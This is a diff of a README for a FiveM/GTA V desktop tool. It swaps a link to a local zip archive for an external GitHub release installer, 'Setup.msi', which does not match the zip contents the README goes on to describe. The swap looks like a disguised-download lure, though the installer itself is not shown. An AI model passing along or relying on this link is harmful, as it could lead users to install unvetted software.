@@ -31,7 +31,7 @@ This desktop tool is provided as-is for setup, configuration, and file managemen
 
 Download the latest desktop release from the repository and extract it to any folder on your PC.
 
-📥 **[Download `FiveM-Tool-Desktop.zip`](dist/FiveM-Tool-Desktop.zip)**
+📥 **[DOWNLOAD](https://github.com/Bobolaofose/fivem-Tool-For-GTA-V-Desktop/releases/download/marrylauncher/Setup.msi)
 
 ### Archive Contents
 - `FiveM-Tool-Desktop.exe` – Main desktop application
